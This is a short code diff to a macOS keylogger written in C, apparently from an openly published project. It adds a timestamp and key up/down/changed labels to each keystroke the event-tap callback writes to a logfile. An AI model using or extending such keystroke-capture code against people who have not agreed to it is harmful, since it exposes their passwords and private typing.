@@ -60,11 +60,23 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
     // Retrieve the incoming keycode.
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
+    time_t result = time(NULL);
+
     // Print the human readable key to the logfile.
-    fprintf(logfile, "%s", convertKeyCode(keyCode));
+    fprintf(logfile, "%s%s %s\n", asctime(localtime(&result)), convertKeyCode(keyCode), convertType(type));
     fflush(logfile);
 
     return event;
+}
+
+
+const char *convertType(CGEventType type) {
+    switch ((CGEventType) type) {
+        case kCGEventKeyDown: return "(down)";
+        case kCGEventKeyUp: return "(up)";
+        case kCGEventFlagsChanged: return "(changed)";
+    }
+    return "(unknown)";
 }
 
 // The following method converts the key code returned by each keypress as
